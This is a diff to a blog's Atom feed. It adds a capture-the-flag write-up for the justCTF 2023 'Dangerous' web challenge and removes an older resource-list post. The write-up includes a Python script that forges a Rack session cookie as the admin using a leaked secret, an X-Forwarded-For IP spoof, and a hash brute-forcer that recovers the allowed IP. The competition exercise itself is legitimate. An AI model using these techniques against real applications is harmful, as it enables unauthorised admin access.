@@ -1,4 +1,138 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.7">Jekyll</generator><link href="https://www.cjxol.com/feed.xml" rel="self" type="application/atom+xml" /><link href="https://www.cjxol.com/" rel="alternate" type="text/html" /><updated>2023-05-22T00:01:51+01:00</updated><id>https://www.cjxol.com/feed.xml</id><title type="html">cjxol.com</title><entry><title type="html">m0leCon Teaser 2023 Writeup</title><link href="https://www.cjxol.com/posts/m0lecon-teaser-2023-writeup/" rel="alternate" type="text/html" title="m0leCon Teaser 2023 Writeup" /><published>2023-05-16T00:00:00+01:00</published><updated>2023-05-16T00:00:00+01:00</updated><id>https://www.cjxol.com/posts/m0lecon-teaser-2023-writeup</id><content type="html" xml:base="https://www.cjxol.com/posts/m0lecon-teaser-2023-writeup/"><![CDATA[<p><a href="https://ctf.m0lecon.it/">m0leCon Teaser 2023</a><br />
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.7">Jekyll</generator><link href="https://www.cjxol.com/feed.xml" rel="self" type="application/atom+xml" /><link href="https://www.cjxol.com/" rel="alternate" type="text/html" /><updated>2023-06-06T00:30:04+01:00</updated><id>https://www.cjxol.com/feed.xml</id><title type="html">cjxol.com</title><entry><title type="html">justCTF 2023 Dangerous (Web) Writeup</title><link href="https://www.cjxol.com/posts/justctf-2023-web-dangerous-writeup/" rel="alternate" type="text/html" title="justCTF 2023 Dangerous (Web) Writeup" /><published>2023-06-05T00:00:00+01:00</published><updated>2023-06-05T00:00:00+01:00</updated><id>https://www.cjxol.com/posts/justctf-2023-web-dangerous-writeup</id><content type="html" xml:base="https://www.cjxol.com/posts/justctf-2023-web-dangerous-writeup/"><![CDATA[<p><a href="https://2023.justctf.team/challenges/18">justCTF 2023 Dangerous (Web)</a><br />
+<a href="https://ctftime.org/event/1930">Event on CTFtime</a></p>
+
+<h2 id="challenge-description">Challenge Description</h2>
+
+<blockquote>
+  <p>My friend told me there’s a secret page on this forum, but it’s only for administrators.</p>
+</blockquote>
+
+<p>A link to the challenge and downloadable of the source code are provided.</p>
+
+<h2 id="a-first-look">A First Look</h2>
+
+<p>The web app is a forum, with two threads posted.</p>
+
+<p><img src="/assets/image/justctf-2023-web-dangerous-writeup/homepage.png" alt="Homepage" /></p>
+
+<p>Viewing one of the threads, it can be seen that the username of admin is <code class="highlighter-rouge">janitor</code>.</p>
+
+<p><img src="/assets/image/justctf-2023-web-dangerous-writeup/thread-1.png" alt="Thread 1" /></p>
+
+<p>The web app is written in Ruby.</p>
+
+<p>The <code class="highlighter-rouge">/flag</code> endpoint and <code class="highlighter-rouge">is_llowed_ip</code> function is especially interesting:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">get</span> <span class="s2">"/flag"</span> <span class="k">do</span>
+  <span class="k">if</span> <span class="o">!</span><span class="n">session</span><span class="p">[</span><span class="ss">:username</span><span class="p">]</span> <span class="k">then</span>
+    <span class="n">erb</span> <span class="ss">:login</span>
+  <span class="k">elsif</span> <span class="o">!</span><span class="n">is_allowed_ip</span><span class="p">(</span><span class="n">session</span><span class="p">[</span><span class="ss">:username</span><span class="p">],</span> <span class="n">request</span><span class="p">.</span><span class="nf">ip</span><span class="p">,</span> <span class="n">config</span><span class="p">)</span> <span class="k">then</span>
+    <span class="k">return</span> <span class="p">[</span><span class="mi">403</span><span class="p">,</span> <span class="s2">"You are connecting from untrusted IP!"</span><span class="p">]</span>
+  <span class="k">else</span>
+    <span class="k">return</span> <span class="n">config</span><span class="p">[</span><span class="s2">"flag"</span><span class="p">]</span> 
+  <span class="k">end</span>
+<span class="k">end</span>
+
+<span class="k">def</span> <span class="nf">is_allowed_ip</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">ip</span><span class="p">,</span> <span class="n">config</span><span class="p">)</span>
+  <span class="k">return</span> <span class="n">config</span><span class="p">[</span><span class="s2">"mods"</span><span class="p">].</span><span class="nf">any?</span> <span class="p">{</span>
+    <span class="o">|</span><span class="n">mod</span><span class="o">|</span> <span class="n">mod</span><span class="p">[</span><span class="s2">"username"</span><span class="p">]</span> <span class="o">==</span> <span class="n">username</span> <span class="n">and</span> <span class="n">mod</span><span class="p">[</span><span class="s2">"allowed_ip"</span><span class="p">]</span> <span class="o">==</span> <span class="n">ip</span>
+  <span class="p">}</span>
+<span class="k">end</span>
+</code></pre></div></div>
+
+<p>It checks the if the user logged in is a moderator and if the IP address is the allowed IP address in a config file.</p>
+
+<h2 id="craft-admin-cookie">Craft Admin Cookie</h2>
+
+<p>When clicking on “New Thread” without filling in anything, the website shows an error page with backtrace and environment information. The session secret as well as how the session cookie is encoded is revealed.</p>
+
+<p><img src="/assets/image/justctf-2023-web-dangerous-writeup/session-options.png" alt="Session options" /></p>
+
+<p>The session is implemented with Rack Protection. With some research into the <a href="https://github.com/sinatra/sinatra/blob/5f4dde19719505989905782a61a19c545df7f9f9/rack-protection/lib/rack/protection/encryptor.rb#L19">source code</a>, and from environment info, it can be seen that the session cookie is encoded and encrypted as follows:</p>
+
+<ol>
+  <li>The data is first serialised with Marshal</li>
+  <li>It is then encrypted with AES-256-GCM with the first 32 bytes of the session secret as the key</li>
+  <li>The encrypted data, IV and authentication tag are then encoded with URL-safe base64</li>
+  <li>The encrypted data, IV and authentication tag are then concatenated with a <code class="highlighter-rouge">--</code> delimiter</li>
+</ol>
+
+<p>My script to modify the session cookie into an admin cookie is as follows:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">base64</span>
+<span class="kn">import</span> <span class="nn">urllib.parse</span>
+<span class="kn">import</span> <span class="nn">rubymarshal.reader</span><span class="p">,</span> <span class="n">rubymarshal</span><span class="p">.</span><span class="n">writer</span>
+<span class="kn">from</span> <span class="nn">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">AES</span>
+
+<span class="n">secret</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">.</span><span class="n">fromhex</span><span class="p">(</span><span class="s">'[secret hex string]'</span><span class="p">)</span>
+<span class="n">cookie</span> <span class="o">=</span> <span class="s">'[original cookie]'</span>
+<span class="n">ct</span><span class="p">,</span> <span class="n">iv</span><span class="p">,</span> <span class="n">auth</span> <span class="o">=</span> <span class="n">cookie</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">'--'</span><span class="p">)</span>
+<span class="n">ct</span><span class="p">,</span> <span class="n">iv</span><span class="p">,</span> <span class="n">auth</span> <span class="o">=</span> <span class="nb">map</span><span class="p">(</span><span class="n">urllib</span><span class="p">.</span><span class="n">parse</span><span class="p">.</span><span class="n">unquote</span><span class="p">,</span> <span class="p">[</span><span class="n">ct</span><span class="p">,</span> <span class="n">iv</span><span class="p">,</span> <span class="n">auth</span><span class="p">])</span>
+<span class="n">ct</span><span class="p">,</span> <span class="n">iv</span><span class="p">,</span> <span class="n">auth</span> <span class="o">=</span> <span class="nb">map</span><span class="p">(</span><span class="n">base64</span><span class="p">.</span><span class="n">b64decode</span><span class="p">,</span> <span class="p">[</span><span class="n">ct</span><span class="p">,</span> <span class="n">iv</span><span class="p">,</span> <span class="n">auth</span><span class="p">])</span>
+<span class="n">cipher</span> <span class="o">=</span> <span class="n">AES</span><span class="p">.</span><span class="n">new</span><span class="p">(</span><span class="n">secret</span><span class="p">[:</span><span class="mi">32</span><span class="p">],</span> <span class="n">AES</span><span class="p">.</span><span class="n">MODE_GCM</span><span class="p">,</span> <span class="n">iv</span><span class="p">)</span>
+<span class="n">dec</span> <span class="o">=</span> <span class="n">cipher</span><span class="p">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">ct</span><span class="p">)</span>
+<span class="n">d</span> <span class="o">=</span> <span class="n">rubymarshal</span><span class="p">.</span><span class="n">reader</span><span class="p">.</span><span class="n">loads</span><span class="p">(</span><span class="n">dec</span><span class="p">)</span>
+
+<span class="n">d</span><span class="p">[</span><span class="s">'username'</span><span class="p">]</span> <span class="o">=</span> <span class="s">'janitor'</span>
+<span class="n">m</span> <span class="o">=</span> <span class="n">rubymarshal</span><span class="p">.</span><span class="n">writer</span><span class="p">.</span><span class="n">writes</span><span class="p">(</span><span class="n">d</span><span class="p">)</span>
+<span class="n">cipher</span> <span class="o">=</span> <span class="n">AES</span><span class="p">.</span><span class="n">new</span><span class="p">(</span><span class="n">secret</span><span class="p">[:</span><span class="mi">32</span><span class="p">],</span> <span class="n">AES</span><span class="p">.</span><span class="n">MODE_GCM</span><span class="p">,</span> <span class="n">iv</span><span class="p">)</span>  <span class="c1"># I just reuse the original IV
+</span><span class="n">ct</span><span class="p">,</span> <span class="n">auth</span> <span class="o">=</span> <span class="n">cipher</span><span class="p">.</span><span class="n">encrypt_and_digest</span><span class="p">(</span><span class="n">m</span><span class="p">)</span>
+<span class="n">ct</span><span class="p">,</span> <span class="n">iv</span><span class="p">,</span> <span class="n">auth</span> <span class="o">=</span> <span class="nb">map</span><span class="p">(</span><span class="n">base64</span><span class="p">.</span><span class="n">b64encode</span><span class="p">,</span> <span class="p">[</span><span class="n">ct</span><span class="p">,</span> <span class="n">iv</span><span class="p">,</span> <span class="n">auth</span><span class="p">])</span>
+<span class="n">ct</span><span class="p">,</span> <span class="n">iv</span><span class="p">,</span> <span class="n">auth</span> <span class="o">=</span> <span class="nb">map</span><span class="p">(</span><span class="n">urllib</span><span class="p">.</span><span class="n">parse</span><span class="p">.</span><span class="n">quote</span><span class="p">,</span> <span class="p">[</span><span class="n">ct</span><span class="p">,</span> <span class="n">iv</span><span class="p">,</span> <span class="n">auth</span><span class="p">])</span>
+<span class="n">cookie</span> <span class="o">=</span> <span class="sa">f</span><span class="s">'</span><span class="si">{</span><span class="n">ct</span><span class="si">}</span><span class="s">--</span><span class="si">{</span><span class="n">iv</span><span class="si">}</span><span class="s">--</span><span class="si">{</span><span class="n">auth</span><span class="si">}</span><span class="s">'</span>
+<span class="k">print</span><span class="p">(</span><span class="n">cookie</span><span class="p">)</span>
+</code></pre></div></div>
+
+<h2 id="bypass-ip-restriction">Bypass IP Restriction</h2>
+
+<p>With the admin cookie, the <code class="highlighter-rouge">/flag</code> endpoint now does not prompt to login, but instead shows a 403 error page with message “You are connecting from untrusted IP!”.</p>
+
+<h3 id="spoof-the-ip-address">Spoof the IP Address</h3>
+
+<p>In <code class="highlighter-rouge">nginx.conf</code>, it can be seen that the <code class="highlighter-rouge">REMOTE_ADDR</code> header is set to localhost with the following:</p>
+
+<div class="language-nginx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">proxy_set_header</span> <span class="s">REMOTE_ADDR</span> <span class="s">localhost</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>Research on how the app gets <code class="highlighter-rouge">request.ip</code>, found in this <a href="https://stackoverflow.com/a/43014286">Stack Overflow answer</a>, that if the <code class="highlighter-rouge">REMOTE_ADDR</code> is in reserved private subnet ranges, it will instead use the <code class="highlighter-rouge">X-Forwarded-For</code> header, thus the IP address can be spoofed with <code class="highlighter-rouge">X-Forwarded-For</code>.</p>
+
+<h3 id="find-the-allowed-ip-address">Find the Allowed IP Address</h3>
+
+<p>However, the allowed IP address is still unknown. Looking at the source code, the user colour uses in each thread uses the first 6 characters of the hex value of SHA-256 of the IP address and thread ID concatenated together.</p>
+
+<div class="language-erb highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;%</span> <span class="n">user_color</span> <span class="o">=</span> <span class="no">Digest</span><span class="o">::</span><span class="no">SHA256</span><span class="p">.</span><span class="nf">hexdigest</span><span class="p">(</span><span class="n">reply</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">+</span> <span class="vi">@id</span><span class="p">).</span><span class="nf">slice</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">6</span><span class="p">)</span> <span class="cp">%&gt;</span>
+</code></pre></div></div>
+
+<p>In the above code, <code class="highlighter-rouge">reply[2]</code> is the IP address of the user who posted the reply, and <code class="highlighter-rouge">@id</code> is the thread ID.</p>
+
+<p>Both of thread 1 and thread 2 have a reply from the admin, so the IP address can be found by brute forcing to find the IP address that produces the matching hashes for both threads.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">Crypto.Hash</span> <span class="kn">import</span> <span class="n">SHA256</span>
+<span class="kn">from</span> <span class="nn">multiprocessing</span> <span class="kn">import</span> <span class="n">Pool</span>
+<span class="n">target</span> <span class="o">=</span> <span class="s">'32cae2'</span>
+<span class="n">thread</span> <span class="o">=</span> <span class="mi">1</span>
+<span class="k">def</span> <span class="nf">brute</span><span class="p">(</span><span class="n">a</span><span class="p">):</span>
+    <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">256</span><span class="p">):</span>
+        <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">256</span><span class="p">):</span>
+            <span class="k">for</span> <span class="n">d</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">256</span><span class="p">):</span>
+                <span class="n">ip</span> <span class="o">=</span> <span class="sa">f</span><span class="s">'</span><span class="si">{</span><span class="n">a</span><span class="si">}</span><span class="s">.</span><span class="si">{</span><span class="n">b</span><span class="si">}</span><span class="s">.</span><span class="si">{</span><span class="n">c</span><span class="si">}</span><span class="s">.</span><span class="si">{</span><span class="n">d</span><span class="si">}</span><span class="s">'</span>
+                <span class="n">x</span> <span class="o">=</span> <span class="n">ip</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">thread</span><span class="p">)</span>
+                <span class="n">h</span> <span class="o">=</span> <span class="n">SHA256</span><span class="p">.</span><span class="n">new</span><span class="p">(</span><span class="n">x</span><span class="p">.</span><span class="n">encode</span><span class="p">()).</span><span class="n">hexdigest</span><span class="p">()[:</span><span class="mi">6</span><span class="p">]</span>
+                <span class="k">if</span> <span class="n">h</span> <span class="o">==</span> <span class="n">target</span><span class="p">:</span>
+                    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'</span><span class="si">{</span><span class="n">a</span><span class="si">}</span><span class="s">.</span><span class="si">{</span><span class="n">b</span><span class="si">}</span><span class="s">.</span><span class="si">{</span><span class="n">c</span><span class="si">}</span><span class="s">.</span><span class="si">{</span><span class="n">d</span><span class="si">}</span><span class="s">'</span><span class="p">,</span> <span class="n">flush</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
+    <span class="k">with</span> <span class="n">Pool</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span> <span class="k">as</span> <span class="n">p</span><span class="p">:</span>
+        <span class="n">p</span><span class="p">.</span><span class="nb">map</span><span class="p">(</span><span class="n">brute</span><span class="p">,</span> <span class="nb">range</span><span class="p">(</span><span class="mi">256</span><span class="p">))</span>
+</code></pre></div></div>
+
+<p>Putting everything together, the flag is:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>justCTF{1_th1nk_4l1ce_R4bb1t_m1ght_4_4_d0g}
+</code></pre></div></div>
+
+<h2 id="additional-notes">Additional Notes</h2>
+
+<p>Rack Protection tracks user agent, and if the user agent is changed, the session cookie will be invalidated. Either the user agent must be spoofed, or the session cookie must be regenerated.</p>]]></content><author><name></name></author><category term="ctf" /><category term="ctf writeup" /><category term="ctf web" /><summary type="html"><![CDATA[justCTF 2023 Dangerous (Web) Event on CTFtime]]></summary></entry><entry><title type="html">m0leCon Teaser 2023 Writeup</title><link href="https://www.cjxol.com/posts/m0lecon-teaser-2023-writeup/" rel="alternate" type="text/html" title="m0leCon Teaser 2023 Writeup" /><published>2023-05-16T00:00:00+01:00</published><updated>2023-05-16T00:00:00+01:00</updated><id>https://www.cjxol.com/posts/m0lecon-teaser-2023-writeup</id><content type="html" xml:base="https://www.cjxol.com/posts/m0lecon-teaser-2023-writeup/"><![CDATA[<p><a href="https://ctf.m0lecon.it/">m0leCon Teaser 2023</a><br />
 <a href="https://ctftime.org/event/1898">On CTFtime</a></p>
 
 <p>Overall good CTF with challenging original fun challenges.</p>
@@ -1481,16 +1615,4 @@ for input_id in input_ids:
     document.getElementById(input_id).addEventListener('input', on_update)
 </py-script>
 
-<script defer="" src="https://pyscript.net/alpha/pyscript.js"></script>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">Awesome Collection</title><link href="https://www.cjxol.com/posts/awesome-collection/" rel="alternate" type="text/html" title="Awesome Collection" /><published>2022-06-17T00:00:00+01:00</published><updated>2022-06-17T00:00:00+01:00</updated><id>https://www.cjxol.com/posts/awesome-collection</id><content type="html" xml:base="https://www.cjxol.com/posts/awesome-collection/"><![CDATA[<p>This post is being continuously updated with a collection of good learning resources.</p>
-
-<p><small>Last updated on 11th Nov 2022.</small></p>
-
-<h2 id="legendres-symbol">Legendre’s Symbol</h2>
-
-<p>A good video by Michael Penn showing proof of the Legendre’s Symbol: <a href="https://www.youtube.com/watch?v=eKjjAr4EvmU">https://www.youtube.com/watch?v=eKjjAr4EvmU</a> (and good backflip) that kept me interested throughout the entire video.</p>
-
-<p><a href="https://cryptohack.org/courses/modular/root1/">A challenge on CryptoHack</a> uses Legendre’s Symbol and more to find the quadratic residue and calculate the square root.</p>
-
-<h2 id="tcp-transmission">TCP Transmission</h2>
-
-<p>Video explaining TCP handshake and transmission step-by-step: <a href="https://youtu.be/v3m9F9nEpCA?t=862">https://youtu.be/v3m9F9nEpCA?t=862</a> by kanak (Connor Nelson) from <a href="https://pwn.college/">pwn.college</a> (ASU CSE 365).</p>]]></content><author><name></name></author><category term="continuously updated" /><summary type="html"><![CDATA[This post is being continuously updated with a collection of good learning resources.]]></summary></entry></feed>
+<script defer="" src="https://pyscript.net/alpha/pyscript.js"></script>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry></feed>
